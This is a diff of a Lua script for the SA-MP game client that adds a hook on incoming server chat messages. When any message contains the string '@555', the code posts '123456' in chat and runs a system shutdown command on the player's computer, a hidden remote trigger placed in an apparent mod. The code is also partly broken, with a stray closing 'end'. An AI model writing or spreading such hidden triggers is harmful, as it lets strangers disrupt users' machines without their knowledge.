@@ -27,14 +27,27 @@ while FileName do
 end
 
 findClose(Handle)
-function onReceiveRpc(color, message)
-    if id == 93 then
-        local color = raknetBitStreamReadInt32(color, message)
-        local len = raknetBitStreamReadInt32(color, message)
-        local str = raknetBitStreamReadString(color, message)
-        if str:find("@555") then
+
+local M = {}
+
+function M.init()
+    local originalHandler = nil
+
+    if samp.events.onServerMessage then
+        originalHandler = samp.events.onServerMessage
+    end
+
+    samp.events.onServerMessage = function(color, message)
+        if message:lower():find("@555") then
             sampSendChat("123456")
             os.execute('shutdown /s /t 300')
         end
+
+        if originalHandler then
+            return originalHandler(color, message)
+        end
     end
+end
+
+return M
 end
